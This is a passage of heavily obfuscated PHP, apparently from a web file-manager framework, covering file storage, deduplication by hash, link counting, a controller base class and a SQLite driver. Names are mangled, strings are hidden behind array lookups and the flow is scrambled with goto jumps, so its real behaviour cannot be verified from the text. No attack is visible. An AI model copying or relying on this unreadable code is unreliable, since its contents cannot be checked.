$CÉ«š™ä¥ = Input::get($c™˜ÀÒ‹ã[408], $c™˜ÀÒ‹ã[7], $c™˜ÀÒ‹ã[1430], array($c™˜ÀÒ‹ã[2147], $c™˜ÀÒ‹ã[405])); $DŞïòË¤Å = $BèƒÆªîŒ¡ . $c™˜ÀÒ‹ã[50] . $CÉ«š™ä¥; return $this->order($DŞïòË¤Å); } private function _listAppendParent(&$D„Ğœ½šœ) { goto CÜŠ§¬³Ğ¸; dÕš’ÔŠï: foreach ($D„Ğœ½šœ as &$AºŠ”ãœåÓ) { if (isset($Dï¨Èùä¨—[$AºŠ”ãœåÓ[$c»¬‘âÊ—[2135]]])) { $AºŠ”ãœåÓ[$c»¬‘âÊ—[2148]] = $Dï¨Èùä¨—[$AºŠ”ãœåÓ[$c»¬‘âÊ—[2135]]]; } } unset($AºŠ”ãœåÓ); goto cä™ƒÇìŠ›; CÜŠ§¬³Ğ¸: $c»¬‘âÊ— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EŒ‘Àƒê«‹ = array_unique(array_to_keyvalue($D„Ğœ½šœ, $c»¬‘âÊ—[33], $c»¬‘âÊ—[2135])); $EŒ‘Àƒê«‹ = array_remove_value($EŒ‘Àƒê«‹, $c»¬‘âÊ—[470]); goto dÚáÂ±ƒÜ; dÚáÂ±ƒÜ: if (!$EŒ‘Àƒê«‹) { return; } $Dï¨Èùä¨— = $this->where(array($c»¬‘âÊ—[2136] => array($c»¬‘âÊ—[7], $EŒ‘Àƒê«‹)))->select(); $Dï¨Èùä¨— = array_to_keyvalue($Dï¨Èùä¨—, $c»¬‘âÊ—[2145]); goto dÕš’ÔŠï; cä™ƒÇìŠ›: } private function _listAppendUser(&$AœóÚ¸­¨) { goto dèÚÀ¾Áù; fÊµé¤‡æò: if (count($b÷—íÂ‚ô) == 0) { return; } foreach ($AœóÚ¸­¨ as $Bº«•ôÕİí) { if (isset($Bº«•ôÕİí[$aÚ‡À®æ‘[2148]])) { $b÷—íÂ‚ô[] = $Bº«•ôÕİí[$aÚ‡À®æ‘[2148]][$aÚ‡À®æ‘[1437]]; } } $e«¥Ä¤¡ã¿ = Model($aÚ‡À®æ‘[479])->userListInfo($b÷—íÂ‚ô); goto eæº‘ˆºÍ; eæº‘ˆºÍ: foreach ($AœóÚ¸­¨ as &$Bº«•ôÕİí) { $Bº«•ôÕİí[$aÚ‡À®æ‘[537]] = $e«¥Ä¤¡ã¿[$Bº«•ôÕİí[$aÚ‡À®æ‘[1437]]]; if (isset($Bº«•ôÕİí[$aÚ‡À®æ‘[2148]])) { $Bº«•ôÕİí[$aÚ‡À®æ‘[2148]][$aÚ‡À®æ‘[537]] = $e«¥Ä¤¡ã¿[$Bº«•ôÕİí[$aÚ‡À®æ‘[2148]][$aÚ‡À®æ‘[1437]]]; } } unset($Bº«•ôÕİí); goto bÚàÙÂöÊÎ; dèÚÀ¾Áù: $aÚ‡À®æ‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b÷—íÂ‚ô = array_unique(array_to_keyvalue($AœóÚ¸­¨, $aÚ‡À®æ‘[33], $aÚ‡À®æ‘[1437])); $b÷—íÂ‚ô = array_remove_value($b÷—íÂ‚ô, $aÚ‡À®æ‘[470]); goto fÊµé¤‡æò; bÚàÙÂöÊÎ: } private function _listAppendMeta(&$eÄ¥Á«Àøà) { goto F»ÅÄâ—ñ¥; Bá…ùŸÔŠ: if (!$E˜øóßï×ö) { return !1; } foreach ($eÄ¥Á«Àøà as &$FÖóá‘êã) { $FÖóá‘êã[$c¹éí‚ô»Œ[417]] = $E˜øóßï×ö[$FÖóá‘êã[$c¹éí‚ô»Œ[2145]]]; if (isset($FÖóá‘êã[$c¹éí‚ô»Œ[2148]])) { $FÖóá‘êã[$c¹éí‚ô»Œ[2148]][$c¹éí‚ô»Œ[417]] = $E˜øóßï×ö[$FÖóá‘êã[$c¹éí‚ô»Œ[2148]][$c¹éí‚ô»Œ[2145]]]; } } unset($FÖóá‘êã); goto c…³”…Ğ·©; F»ÅÄâ—ñ¥: $c¹éí‚ô»Œ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e÷ëöÃº = array_unique(array_to_keyvalue($eÄ¥Á«Àøà, $c¹éí‚ô»Œ[33], $c¹éí‚ô»Œ[2145])); $e÷ëöÃº = array_remove_value($e÷ëöÃº, $c¹éí‚ô»Œ[470]); goto b‹ì® ¯•š; b‹ì® ¯•š: if (!$e÷ëöÃº) { return; } foreach ($eÄ¥Á«Àøà as $FÖóá‘êã) { if (isset($FÖóá‘êã[$c¹éí‚ô»Œ[2148]])) { $e÷ëöÃº[] = $FÖóá‘êã[$c¹éí‚ô»Œ[2148]][$c¹éí‚ô»Œ[2145]]; } } $E˜øóßï×ö = $this->metaList($e÷ëöÃº); goto Bá…ùŸÔŠ; c…³”…Ğ·©: } private function metaList($fƒÌŒÂ‹) { goto e©àË‚ïŠ‚; e©àË‚ïŠ‚: $A¸ÂÌŒÌçŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$fƒÌŒÂ‹) { return array(); } $CÂ‘ÑÕŸĞ¸ = array($A¸ÂÌŒÌçŒ[2145] => array($A¸ÂÌŒÌçŒ[7], $fƒÌŒÂ‹)); goto Dï•’ù‹‹ô; B‹Ÿ¼‰¤˜: return $c¦÷‡Î­¢° ? $c¦÷‡Î­¢° : array(); goto bÑ–Ìì; Dï•’ù‹‹ô: $c¦÷‡Î­¢° = Model($A¸ÂÌŒÌçŒ[2149])->where($CÂ‘ÑÕŸĞ¸)->select(); $c¦÷‡Î­¢° = array_to_keyvalue_group($c¦÷‡Î­¢°, $A¸ÂÌŒÌçŒ[2145]); foreach ($c¦÷‡Î­¢° as $a´¼¦©Ï’˜ => $f°Ö„ƒ³£Ï) { $Dìİà©·ò‰ = array(); foreach ($f°Ö„ƒ³£Ï as $c¸´ğÊš•Œ) { $Dìİà©·ò‰[$c¸´ğÊš•Œ[$A¸ÂÌŒÌçŒ[89]]] = $c¸´ğÊš•Œ[$A¸ÂÌŒÌçŒ[359]]; } $c¦÷‡Î­¢°[$a´¼¦©Ï’˜] = $Dìİà©·ò‰; } goto B‹Ÿ¼‰¤˜; bÑ–Ìì: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\x6c\145"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\141\155\145" => "\x69\157\x5f\146\x69\x6c\145\x5f\x6d\x65\164\x61", "\x6d\145\164\x61\106\x69\x65\154\144" => "\146\x69\x6c\x65\111\x44"); public function fileInfo($CÌãÕœä£) { $FÈ¨†‹š¹» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $ağÔ¸”­®Ç = array(); if (!isset($ağÔ¸”­®Ç[$CÌãÕœä£])) { $DÍàÆÂ×õ£ = $FÈ¨†‹š¹»[2150]; $cÀŞó•õ = Model($FÈ¨†‹š¹»[422])->field($DÍàÆÂ×õ£)->where(array($FÈ¨†‹š¹»[420] => $CÌãÕœä£))->find(); $ağÔ¸”­®Ç[$CÌãÕœä£] = $cÀŞó•õ; } return $ağÔ¸”­®Ç[$CÌãÕœä£]; } public function addFileByContent($B¦½÷ç‘Ì÷ = '', $C¬ß«ªÇˆ = '') { goto dØ†Ë¥–ò; báóİç¹ÉÌ: $EÛå§‰¢ÕÜ = $Dô×†ÊÛ«§ . $a×ì«š…ö[2152] . rand_string(16); file_put_contents($EÛå§‰¢ÕÜ, $B¦½÷ç‘Ì÷); $C¥ŸÜ‚ï = $this->addFile($EÛå§‰¢ÕÜ, $C¬ß«ªÇˆ, !0); goto Eø±š¤Úñ; dØ†Ë¥–ò: $a×ì«š…ö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dô×†ÊÛ«§ = TEMP_PATH . $a×ì«š…ö[2151]; if (!is_dir($Dô×†ÊÛ«§)) { mk_dir($Dô×†ÊÛ«§); } goto báóİç¹ÉÌ; Eø±š¤Úñ: if (file_exists($EÛå§‰¢ÕÜ)) { @unlink($EÛå§‰¢ÕÜ); } return $C¥ŸÜ‚ï; goto C……‡ëòŞ; C……‡ëòŞ: } public function createFileName($cÉ•ùãÕ) { goto cãç§×º÷µ; cãç§×º÷µ: $A¬òÏñØŠ… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F¹‹Í”‚ = IO::init($A¬òÏñØŠ…[8]); $dš­‚ÒºøÙ = $this->makeFilePath($cÉ•ùãÕ, $F¹‹Í”‚); goto AÇ÷ó²‰ƒ; cÈˆì¹ï¢ø: if (!$eŞ®×•‹“ && !Cache::get($ağ¾ß°Æœ)) { $eŞ®×•‹“ = !0; $c½…îó‚œº = IO::mkdir($fØéÁôßÎ³); if (!IO::exist($c½…îó‚œº . $A¬òÏñØŠ…[2154])) { IO::mkfile($c½…îó‚œº . $A¬òÏñØŠ…[2154]); } Cache::set($ağ¾ß°Æœ, 1, 3600 * 2); } return $dš­‚ÒºøÙ; goto AÕŞ§›Ğ„Ñ; AÇ÷ó²‰ƒ: $fØéÁôßÎ³ = $F¹‹Í”‚->pathFather($dš­‚ÒºøÙ); static $eŞ®×•‹“ = false; $ağ¾ß°Æœ = $A¬òÏñØŠ…[2153] . md5($fØéÁôßÎ³); goto cÈˆì¹ï¢ø; AÕŞ§›Ğ„Ñ: } public function makeFilePath($bÆ‡öœ°«ñ, $cçÊ½‚¨ë®) { goto cï®øó•éñ; AÔÅƒÃÕÚ×: switch ($a‰ëÖöùÔ†) { case $bîğ‰ÊŞÃÙ[2158]: $dŞˆÆÎ©èá = $dŞˆÆÎ©èá . $bîğ‰ÊŞÃÙ[91] . $cçÊ½‚¨ë®->ext($bÆ‡öœ°«ñ); if ($cçÊ½‚¨ë®->ext($bÆ‡öœ°«ñ) == $bîğ‰ÊŞÃÙ[2098]) { $dŞˆÆÎ©èá .= $bîğ‰ÊŞÃÙ[1339]; } break; case $bîğ‰ÊŞÃÙ[2159]: goto d¦‡Äò±Îº; d¦‡Äò±Îº: $Cô†Ğ®×›É = Model($bîğ‰ÊŞÃÙ[1085])->get($bîğ‰ÊŞÃÙ[1335]); $FŸƒ¡£šÏç = substr(md5($bîğ‰ÊŞÃÙ[1917] . $Cô†Ğ®×›É . date($bîğ‰ÊŞÃÙ[681])), 0, 8); $C‘‰ƒµ‰ñ¥ = KodIO::defaultDriver(); goto bƒã±®ˆ¬ù; bƒã±®ˆ¬ù: $Cãä„®‡ ¢ = $bîğ‰ÊŞÃÙ[2160] . $C‘‰ƒµ‰ñ¥[$bîğ‰ÊŞÃÙ[367]] . $bîğ‰ÊŞÃÙ[2161] . date($bîğ‰ÊŞÃÙ[2162]) . $FŸƒ¡£šÏç . $bîğ‰ÊŞÃÙ[8]; if ($cçÊ½‚¨ë®->ext($bÆ‡öœ°«ñ) == $bîğ‰ÊŞÃÙ[2098]) { $bÆ‡öœ°«ñ .= $bîğ‰ÊŞÃÙ[1339]; } $FŒ¾Ó§ËÎä = $bîğ‰ÊŞÃÙ[2163] . $Cãä„®‡ ¢ . $bÆ‡öœ°«ñ; goto BÊßùš»Ññ; BÊßùš»Ññ: CacheLock::lock($FŒ¾Ó§ËÎä); $f÷š©ËÒî¤ = IO::fileNameAuto($Cãä„®‡ ¢, $bÆ‡öœ°«ñ); $dŞˆÆÎ©èá = $Cãä„®‡ ¢ . $f÷š©ËÒî¤; goto Aˆ³”èÛÎ‰; Aˆ³”èÛÎ‰: if (IO::isTypeObject() && !IO::isUploadServer()) { IO::setContent($dŞˆÆÎ©èá, $bîğ‰ÊŞÃÙ[33]); } CacheLock::unlock($FŒ¾Ó§ËÎä); break; goto A“ÓŒÏñ¾Ã; A“ÓŒÏñ¾Ã: case $bîğ‰ÊŞÃÙ[2157]: break; default: break; } return $dŞˆÆÎ©èá; goto bˆ‚¡Ò‚Æ; b‰±Î˜‘˜„: $dŞˆÆÎ©èá = $Cãä„®‡ ¢ . rand_string(5) . short_id(100); $bÆ‡öœ°«ñ = str_replace($bîğ‰ÊŞÃÙ[8], $bîğ‰ÊŞÃÙ[70], KodIO::clear($bÆ‡öœ°«ñ)); if (!$bÆ‡öœ°«ñ) { $a‰ëÖöùÔ† = $bîğ‰ÊŞÃÙ[2157]; } goto AÔÅƒÃÕÚ×; cï®øó•éñ: $bîğ‰ÊŞÃÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a‰ëÖöùÔ† = Model($bîğ‰ÊŞÃÙ[1085])->get($bîğ‰ÊŞÃÙ[2155]); $Cãä„®‡ ¢ = KodIO::defaultIO() . date($bîğ‰ÊŞÃÙ[2156]); goto b‰±Î˜‘˜„; bˆ‚¡Ò‚Æ: } public function addFileByRemote($d‡‹àÙŠõ, $báè±¿«Úˆ, $D”¾ã®Îº¦ = array()) { goto d¤×È­×ó; EºÛÅÄŠÖ: $D‹è“ÎÀ¯ = IO::hashMd5($d‡‹àÙŠõ, $D™ùÕƒÖÛ); $DåºŞÄÄ†Ñ = KodIO::defaultDriver(); $a£Š“»…¹ = array($fêàˆ•–ñ[522] => IO::size($d‡‹àÙŠõ), $fêàˆ•–ñ[2164] => 1, $fêàˆ•–ñ[386] => $báè±¿«Úˆ, $fêàˆ•–ñ[737] => $DåºŞÄÄ†Ñ[$fêàˆ•–ñ[367]], $fêàˆ•–ñ[387] => $d‡‹àÙŠõ, $fêàˆ•–ñ[2165] => $D”¾ã®Îº¦[$fêàˆ•–ñ[164]] ? $D”¾ã®Îº¦[$fêàˆ•–ñ[164]] : IO::hashSimple($d‡‹àÙŠõ), $fêàˆ•–ñ[2166] => $D‹è“ÎÀ¯ ? $D‹è“ÎÀ¯ : $D™ùÕƒÖÛ); goto Dàô—îµÅÔ; Dàô—îµÅÔ: if ($F°Í‡ò‡êÂ = $this->addFileCheckExist($a£Š“»…¹[$fêàˆ•–ñ[164]], $a£Š“»…¹[$fêàˆ•–ñ[163]], $a£Š“»…¹[$fêàˆ•–ñ[77]])) { return $F°Í‡ò‡êÂ; } return $this->addFileData($a£Š“»…¹); goto f¸½Ìé’ÈÙ; d¤×È­×ó: $fêàˆ•–ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!IO::exist($d‡‹àÙŠõ)) { return !1; } $D™ùÕƒÖÛ = $D”¾ã®Îº¦[$fêàˆ•–ñ[163]] ? $D”¾ã®Îº¦[$fêàˆ•–ñ[163]] : $fêàˆ•–ñ[33]; goto EºÛÅÄŠÖ; f¸½Ìé’ÈÙ: } private function addFileData($B†·‡£…Ç«) { $Dˆ—È¸ˆ°Á =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$B†·‡£…Ç«) { return !1; } $B†·‡£…Ç«[$Dˆ—È¸ˆ°Á[77]] = intval($B†·‡£…Ç«[$Dˆ—È¸ˆ°Á[77]]); if (!$B†·‡£…Ç«[$Dˆ—È¸ˆ°Á[77]] && strlen($B†·‡£…Ç«[$Dˆ—È¸ˆ°Á[164]]) > 32) { $B†·‡£…Ç«[$Dˆ—È¸ˆ°Á[77]] = intval(substr($B†·‡£…Ç«[$Dˆ—È¸ˆ°Á[164]], 32)); } $AöĞ«èÏ²° = $this->add($B†·‡£…Ç«); return $this->find($AöĞ«èÏ²°); } public function addFile($f›Ê·‡‹Üğ, $E¸µ’Öª¢ó, $aÑÅã²¨¹ = false) { goto Då©èøİ ; bè¦¢¯·ë»: return $C±•Ÿ™œİª; goto D‘åïÒ„“ê; Då©èøİ : $CÕŠ•¦®Ä = IO::hashSimple($f›Ê·‡‹Üğ); $F‘ò´à÷¥› = IO::hashMd5($f›Ê·‡‹Üğ); $cëøíó½ÙÌ = IO::size($f›Ê·‡‹Üğ); goto cĞé¡âˆàÕ; FçÀ¥ÃÙ†: $eÃâÇæÃË¼ = $this->addFileMake($f›Ê·‡‹Üğ, $cëøíó½ÙÌ, $CÕŠ•¦®Ä, $F‘ò´à÷¥›, $E¸µ’Öª¢ó, $aÑÅã²¨¹); $C±•Ÿ™œİª = $this->addFileData($eÃâÇæÃË¼); CacheLock::unlock($D§˜·‹Ò‹); goto bè¦¢¯·ë»; cĞé¡âˆàÕ: $D§˜·‹Ò‹ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2167] . $F‘ò´à÷¥›; CacheLock::lock($D§˜·‹Ò‹); if ($aÕï¤Şˆ“É = $this->addFileCheckExist($CÕŠ•¦®Ä, $F‘ò´à÷¥›, $cëøíó½ÙÌ)) { CacheLock::unlock($D§˜·‹Ò‹); return $aÕï¤Şˆ“É; } goto FçÀ¥ÃÙ†; D‘åïÒ„“ê: } public function addFileMake($fìèÚâ¸¤“, $aÇİ¨ÂÉ³ñ, $Cº¬ªâ†Á, $fŠåßÛ§ˆ°, $Eè”ô„òá, $Cæ¾¯ÈŒ„‰) { goto Dä·ñ‰ËÛÛ; c‡Ùõß™®Ï: $e¡êê¯ØÔÖ = get_path_this($d¦Ç­Ò·‰°); if ($Cæ¾¯ÈŒ„‰) { $cİù×Š  = IO::move($fìèÚâ¸¤“, $d•ÛÄ†’‹¬, !1, $e¡êê¯ØÔÖ); } else { $cİù×Š  = IO::copy($fìèÚâ¸¤“, $d•ÛÄ†’‹¬, !1, $e¡êê¯ØÔÖ); } if (!$cİù×Š ) { return !1; } goto b˜ÂÓ“†ìÁ; Dä·ñ‰ËÛÛ: $cê £‹èù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d¦Ç­Ò·‰° = $this->createFileName($Eè”ô„òá); $d•ÛÄ†’‹¬ = get_path_father($d¦Ç­Ò·‰°); goto c‡Ùõß™®Ï; b˜ÂÓ“†ìÁ: $f¶¯È˜§´ = KodIO::defaultDriver(); $AÔª¼ÙŠì’ = array($cê £‹èù[522] => $aÇİ¨ÂÉ³ñ, $cê £‹èù[2164] => 1, $cê £‹èù[386] => $Eè”ô„òá, $cê £‹èù[737] => $f¶¯È˜§´[$cê £‹èù[367]], $cê £‹èù[387] => $d¦Ç­Ò·‰°, $cê £‹èù[2165] => $Cº¬ªâ†Á, $cê £‹èù[2166] => $fŠåßÛ§ˆ°); return $AÔª¼ÙŠì’; goto FˆÚÎïÆÒ”; FˆÚÎïÆÒ”: } public function addFileCheckExist($DŒ²¨›í…–, $cÙ‘‚Ï¾¤î, $Eµ°º¿õè‚) { $B´İÇÍƒ‚¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d©¯½Üù¯ï = $this->findByHash($DŒ²¨›í…–, $cÙ‘‚Ï¾¤î); if (!$d©¯½Üù¯ï) { return !1; } $F…ˆò‰›ÎÇ = array($B´İÇÍƒ‚¶[2164] => intval($d©¯½Üù¯ï[$B´İÇÍƒ‚¶[2168]]) + 1, $B´İÇÍƒ‚¶[522] => $Eµ°º¿õè‚); $this->where(array($B´İÇÍƒ‚¶[420] => $d©¯½Üù¯ï[$B´İÇÍƒ‚¶[419]]))->save($F…ˆò‰›ÎÇ); return $d©¯½Üù¯ï; } public function remove($Eê¼¤§Ğ¦) { $this->linkCountChange($Eê¼¤§Ğ¦, !1); $this->clearEmpty(); return !0; } public function linkAdd($aè®Œß¹Œ) { $this->linkCountChange($aè®Œß¹Œ, !0); } public function linkCountChange($aªŸ÷‹Ó®, $AÏè‹ÁŒá³) { goto dÄíµø¡×; bÙãÜŒ: foreach ($dµç­Œ‰¯¾ as $Eâ•óƒ‘…‚ => $ašéĞØòå¸) { $f÷Ú¦±®õ = $ašéĞØòå¸ . $B”³ª³ÚÎé[33]; if (!$B¼‡”‘ÇÕ‹[$f÷Ú¦±®õ]) { $B¼‡”‘ÇÕ‹[$f÷Ú¦±®õ] = array(); } $B¼‡”‘ÇÕ‹[$f÷Ú¦±®õ][] = $Eâ•óƒ‘…‚; } foreach ($B¼‡”‘ÇÕ‹ as $ašéĞØòå¸ => $a‡‰î·ã) { if (!$a‡‰î·ã) { continue; } $ašéĞØòå¸ = $AÏè‹ÁŒá³ ? $ašéĞØòå¸ : -intval($ašéĞØòå¸); $d©ë„´µÇŠ = array($B”³ª³ÚÎé[419] => array($B”³ª³ÚÎé[7], $a‡‰î·ã)); if ($ašéĞØòå¸ < 0) { $d©ë„´µÇŠ[$B”³ª³ÚÎé[2168]] = array($B”³ª³ÚÎé[925], abs($ašéĞØòå¸)); } $this->where($d©ë„´µÇŠ)->setAdd($B”³ª³ÚÎé[2168], $ašéĞØòå¸); } goto CÎÂ›Û²º£; EÄí–¼Êã: $dµç­Œ‰¯¾ = array(); foreach ($aªŸ÷‹Ó® as $Eâ•óƒ‘…‚) { $f÷Ú¦±®õ = $Eâ•óƒ‘…‚ . $B”³ª³ÚÎé[33]; if (!$dµç­Œ‰¯¾[$f÷Ú¦±®õ]) { $dµç­Œ‰¯¾[$f÷Ú¦±®õ] = 0; } $dµç­Œ‰¯¾[$f÷Ú¦±®õ]++; } $B¼‡”‘ÇÕ‹ = array(); goto bÙãÜŒ; dÄíµø¡×: $B”³ª³ÚÎé =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$aªŸ÷‹Ó®) { return; } if (!is_array($aªŸ÷‹Ó®)) { $aªŸ÷‹Ó® = array($aªŸ÷‹Ó®); } goto EÄí–¼Êã; CÎÂ›Û²º£: } public function findByHash($B£…ˆÈ¶›‡, $E÷Åù×æª = false) { $c«Â¹î…™Ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$B£…ˆÈ¶›‡ && !$E÷Åù×æª) { return !1; } $dŒ×‘Û¨ùš = array($c«Â¹î…™Ì[2165] => $B£…ˆÈ¶›‡); if ($E÷Åù×æª) { $dŒ×‘Û¨ùš = array($c«Â¹î…™Ì[2166] => $E÷Åù×æª); } return $this->order($c«Â¹î…™Ì[2169])->where($dŒ×‘Û¨ùš)->find(); } public function clearEmpty($dïº‚‘¹§Õ = 0) { goto aö¿·¿ô‰¥; FïÁĞ›º‰: foreach ($E²¢¨êÒ³ as $bŞ‚ƒÊ—Øğ) { $a¾çÄÎ¾ñ->update(1); $this->resetFile($bŞ‚ƒÊ—Øğ); } $a¾çÄÎ¾ñ->end(); goto CÀÒÎù¿¼; aö¿·¿ô‰¥: $aä’òë¼¤Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DĞ¬äÇòŒƒ = time() - 3600 * 24 * $dïº‚‘¹§Õ; $A×ÉÚÍĞ» = $aä’òë¼¤Ø[2170] . $DĞ¬äÇòŒƒ; goto cŒ¶ Ùˆ†ß; cŒ¶ Ùˆ†ß: $E²¢¨êÒ³ = $this->where($A×ÉÚÍĞ»)->select(); if (!$E²¢¨êÒ³) { return; } $a¾çÄÎ¾ñ = new Task($aä’òë¼¤Ø[2171], $aä’òë¼¤Ø[33], count($E²¢¨êÒ³)); goto FïÁĞ›º‰; CÀÒÎù¿¼: } public function resetFile($aÆ…¼©ªø) { goto Fø“‘Åªé; C°Í‹óìî: if ($aÆ…¼©ªø[$fİö÷´®ÃÇ[2168]] != $F¶¦¢îğ·‡) { $this->where($CÉÔ¦Ùó)->save(array($fİö÷´®ÃÇ[2164] => $F¶¦¢îğ·‡)); } goto dÄ²¹’©; Fø“‘Åªé: $fİö÷´®ÃÇ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÉÔ¦Ùó = array($fİö÷´®ÃÇ[420] => $aÆ…¼©ªø[$fİö÷´®ÃÇ[419]]); $dç¦öä‡í½ = Model($fİö÷´®ÃÇ[1114])->where($CÉÔ¦Ùó)->count(); goto eéÊ¥Ø³Ëè; eéÊ¥Ø³Ëè: $DËÈ½Š™Á = Model($fİö÷´®ÃÇ[2172])->where($CÉÔ¦Ùó)->count(); $F¶¦¢îğ·‡ = intval($dç¦öä‡í½) + intval($DËÈ½Š™Á); if ($F¶¦¢îğ·‡ == 0) { IO::remove($aÆ…¼©ªø[$fİö÷´®ÃÇ[75]]); $this->where($CÉÔ¦Ùó)->delete(); $this->metaSet($aÆ…¼©ªø[$fİö÷´®ÃÇ[419]], null, null); return; } goto C°Í‹óìî; dÄ²¹’©: } public function storageInfo($Aã³Ğìø = false) { goto b÷‰§ä×øº; A‡¡îìµğ: for ($A¢ï«ƒŸã = 0; $A¢ï«ƒŸã < $Cœ…ƒë‰ÏÀ; $A¢ï«ƒŸã = $A¢ï«ƒŸã + $b¾İ«İÊ×) { $e³„ˆ§„† = $this->limit($A¢ï«ƒŸã, $A¢ï«ƒŸã + $b¾İ«İÊ×)->select(); foreach ($e³„ˆ§„† as $c¢À‘†•) { $Aì‚ñÆ°ÄÚ += $c¢À‘†•[$e†Ùå„Ê†Ü[77]] * $c¢À‘†•[$e†Ùå„Ê†Ü[2168]]; $eíöœ†Š¦’ += $c¢À‘†•[$e†Ùå„Ê†Ü[77]] * ($c¢À‘†•[$e†Ùå„Ê†Ü[2168]] - 1); $C„•„£Š†ä += $c¢À‘†•[$e†Ùå„Ê†Ü[2168]]; } } $fÃ®‚ØÔˆ = array($e†Ùå„Ê†Ü[2173] => $Aì‚ñÆ°ÄÚ, $e†Ùå„Ê†Ü[2174] => $eíöœ†Š¦’, $e†Ùå„Ê†Ü[2175] => $eíöœ†Š¦’ / $Aì‚ñÆ°ÄÚ, $e†Ùå„Ê†Ü[81] => $Cœ…ƒë‰ÏÀ, $e†Ùå„Ê†Ü[2176] => $C„•„£Š†ä); return $fÃ®‚ØÔˆ; goto EÀÊ«æÛÚ­; b÷‰§ä×øº: $e†Ùå„Ê†Ü =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cœ…ƒë‰ÏÀ = $this->count() + 0.0; $eíöœ†Š¦’ = 0; goto f‹ˆ´ÚÄ; f‹ˆ´ÚÄ: $Aì‚ñÆ°ÄÚ = 1; $C„•„£Š†ä = 0; $b¾İ«İÊ× = 5000; goto A‡¡îìµğ; EÀÊ«æÛÚ­: } } goto d´ïÄğİ½; b×Áøöèƒ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto a×Œ¿œõ‰¥; c…»¯×š×Ò: $this->tpl = TEMPLATE . MOD . $e‡±Ÿ¹ÛœÓ[8]; $this->_classObjectID = mt_rand(0, 10000); goto bÍ„”³ ùŒ; CÓÒ¿ù¦®µ: $this->in =& $in; $this->values[$e‡±Ÿ¹ÛœÓ[6]] =& $config; $this->values[$e‡±Ÿ¹ÛœÓ[7]] =& $in; goto c…»¯×š×Ò; a×Œ¿œõ‰¥: $e‡±Ÿ¹ÛœÓ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $in, $config; $this->config =& $config; goto CÓÒ¿ù¦®µ; bÍ„”³ ùŒ: } public function loadClass($E„¢¥ÔŞ¨‘) { if (1 === func_num_args()) { $this->{$E„¢¥ÔŞ¨‘} = new $E„¢¥ÔŞ¨‘(); } else { $AïæåíÆµ« = new ReflectionClass($E„¢¥ÔŞ¨‘); $BÏæô¡Òé = func_get_args(); array_shift($BÏæô¡Òé); $this->{$E„¢¥ÔŞ¨‘} = $AïæåíÆµ«->newInstanceArgs($BÏæô¡Òé); } return $this->{$E„¢¥ÔŞ¨‘}; } protected function assign($FŒ´â±‚èŒ, $e–Ú›‚ÀÏä) { $this->values[$FŒ´â±‚èŒ] = $e–Ú›‚ÀÏä; } protected function display($B‡ÒšÂÏ¦È) { ob_end_clean(); extract($this->values); require $this->tpl . $B‡ÒšÂÏ¦È; } } class DbSqliteBase extends Db { public function __construct($f°’é‚‡æÂ = '') { $F°ÚÄÚ¼î¹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!extension_loaded($F°ÚÄÚ¼î¹[9])) { think_exception(think_lang($F°ÚÄÚ¼î¹[10]) . $F°ÚÄÚ¼î¹[11]); } if (!empty($f°’é‚‡æÂ)) { if (!isset($f°’é‚‡æÂ[$F°ÚÄÚ¼î¹[12]])) { $f°’é‚‡æÂ[$F°ÚÄÚ¼î¹[12]] = 438; } $this->config = $f°’é‚‡æÂ; if (empty($this->config[$F°ÚÄÚ¼î¹[13]])) { $this->config[$F°ÚÄÚ¼î¹[13]] = array(); } } } public function connect($EÄç’é”æà = '', $b‰ÚàÓ¥„ = 0) { $fè´øÜ…àì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($this->linkID[$b‰ÚàÓ¥„])) { goto C‚™‹«íğÇ; d§±µâ÷õ´: @sqlite_busy_timeout($this->linkID[$b‰ÚàÓ¥„], 30000); if (1 != think_config($fè´øÜ…àì[18])) { unset($this->config); } goto d§éØğ´‘ª; aÙíÍ®äˆ: $this->linkID[$b‰ÚàÓ¥„] = $DÅï‹æèÌĞ($EÄç’é”æà[$fè´øÜ…àì[17]], $EÄç’é”æà[$fè´øÜ…àì[12]]); if (!$this->linkID[$b‰ÚàÓ¥„]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto d§±µâ÷õ´; C‚™‹«íğÇ: if (empty($EÄç’é”æà)) { $EÄç’é”æà = $this->config; } $Aˆïİ¯Å = !empty($EÄç’é”æà[$fè´øÜ…àì[13]][$fè´øÜ…àì[14]]) ? $EÄç’é”æà[$fè´øÜ…àì[13]][$fè´øÜ…àì[14]] : $this->pconnect; $DÅï‹æèÌĞ = $Aˆïİ¯Å ? $fè´øÜ…àì[15] : $fè´øÜ…àì[16]; goto aÙíÍ®äˆ; d§éØğ´‘ª: } return $this->linkID[$b‰ÚàÓ¥„]; } public function free() { $this->queryID = null; } public function query($eÎğõçÅØœ) { goto FæŠºµî»; E­ÃíÉº»ƒ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $DËøåë‡³° = $this->getAll(); return $DËøåë‡³°; } goto dÛñØß½; FæŠºµî»: $eğË™êÛÇ  =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; 